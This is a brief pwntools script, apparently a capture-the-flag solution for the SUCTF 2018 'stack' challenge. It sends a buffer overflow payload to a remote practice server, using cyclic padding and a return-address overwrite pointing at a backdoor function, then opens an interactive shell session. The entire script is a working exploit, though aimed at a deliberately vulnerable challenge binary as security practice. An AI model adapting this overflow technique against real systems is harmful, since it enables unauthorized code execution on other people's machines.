from pwn import *

context(os = 'linux', arch = 'amd64', log_level = 'debug')
# io = process('SUCTF_2018_stack')
io = remote('node4.buuoj.cn', 26510)
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
# libc = ELF('libc-2.23.so')
elf = ELF('SUCTF_2018_stack')
backdoor = 0x400677

payload = cyclic(0x28) + p64(backdoor)
io.sendlineafter('============================\n', payload)
io.interactive()
